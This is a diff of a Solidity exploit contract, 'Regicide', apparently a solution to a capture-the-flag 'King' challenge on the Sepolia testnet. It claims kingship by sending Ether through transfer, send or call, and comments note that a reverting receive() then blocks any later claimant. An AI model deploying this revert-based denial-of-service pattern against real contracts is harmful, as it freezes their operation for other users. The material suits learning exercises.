@@ -8,21 +8,27 @@ pragma solidity ^0.8.0;
  * The trouble wasn't the submitting instance part: knew that it was just a matter of reverting inside a receive() function
  * The trouble, however, was in becoming King in the first place.
  * All transactions were reverting when using .transfer()and .send() functions. .call() works, and I don't have much idea why!
- *
+ * Contract deployed at 0xF6Dd68a0ACa03BC141541274A3bAaa5626160259 in Sepolia
  */
 
 contract Regicide {
-    address constant kingContractAddress = 0x98D418Af538Ae5D70893E5C554AA3FAC6155a18b;
+    address kingContractAddress = 0x63F28824DEC7C2403D7dfA2F70F206D1B777B16D;
 
-    function takeTheThrone() public payable {
-        // payable(kingContractAddress).transfer(msg.value);
-        // bool success = payable(kingContractAddress).send(msg.value);
-        // if(!success){
-        //     revert();
-        // }
+    // Transaction fails
+    function takeTheThroneWithTransfer() public payable {
+        payable(kingContractAddress).transfer(msg.value);
+    }
 
-        (bool sent,) = kingContractAddress.call{value: msg.value}("");
-        require(sent, "Failed to send Ether");
+    // Transaction fails
+    function takeTheThroneWithSend() public payable {
+        bool success = payable(kingContractAddress).send(msg.value);
+        require(success, "Failed to send Ether");
+    }
+
+    // Transaction succeeds, attains Kingship
+    function takeTheThroneWithCall() public payable {
+        (bool success,) = kingContractAddress.call{value: msg.value}("");
+        require(success, "Failed to send Ether");
     }
 
     receive() external payable {
